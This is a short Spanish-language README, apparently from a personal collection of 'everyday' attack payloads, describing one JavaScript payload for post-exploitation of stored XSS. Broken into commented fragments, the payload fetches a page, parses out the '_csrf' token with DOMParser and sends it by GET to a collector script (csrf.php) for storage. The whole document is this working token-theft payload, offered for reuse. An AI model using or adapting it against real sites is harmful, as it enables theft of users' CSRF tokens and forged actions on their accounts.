
# Payloads Varios

Aqui guardo algunos payloads de uso cotidiano, como para tenerlos a mano.

## XSSStoredParserBODY.js

Su funcion esta pensada para un escenario de post explotacion de XSS Stored en donde es necesario extraer algun dato del usuario **DEL BODY**, como un token CSRF.
>fetch('http://URL') -> peticion GET sin opciones

>r=>r.text() -> Response a texto

>d=>{fetch('http://localhost/csrf.php?i='+ -> llamada a accion, en este caso enviar el token por GET a ser almacenado en archivo localhost

>new DOMParser().parseFromString(d, "text/html").getElementsByName("_csrf")[0].value) -> parseo token por nombre de elemento en el html

>{mode:'no-cors'})} -> opciones para finalizar el fetch de salida

_**Salu2**_
